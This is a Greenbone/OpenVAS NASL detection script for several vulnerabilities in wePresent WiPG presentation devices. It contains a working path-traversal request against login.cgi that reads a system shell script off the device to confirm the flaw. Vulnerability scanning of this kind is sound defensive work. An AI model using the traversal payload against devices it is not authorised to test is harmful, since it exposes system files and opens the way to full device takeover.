CPE = "cpe:/a:wepresent:wipg";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106782" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2017-04-21 08:12:54 +0200 (Fri, 21 Apr 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "wePresent WiPG Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wepresent_wipg_detect.sc" );
	script_mandatory_keys( "wepresent_wipg/model" );
	script_tag( name: "summary", value: "wePresent WiPG devices are prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP request and checks the response." );
	script_tag( name: "insight", value: "wePresent WiPG devices are prone to multiple vulnerabilities:

  - Web-UI authentication bypasses

  - Web-UI privilege escalation

  - OS command injection

  - Arbitrary file disclosure

  - File inclusion

  - Insecure maintenance interface" );
	script_tag( name: "impact", value: "A unauthenticed attacker may gain complete control over the device." );
	script_tag( name: "affected", value: "wePresent WiPG-1000, WiPG-1500 and WiPG-2000 devices." );
	script_tag( name: "solution", value: "Upgrade to firmware version 2.2.3.0 or later." );
	script_xref( name: "URL", value: "https://www.redguard.ch/advisories/wepresent-wipg1000.txt" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = "/cgi-bin/login.cgi?lang=en&src=../../../bin/mountstor.sh";
if(http_vuln_check( port: port, url: url, pattern: "^LOGFILE=", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

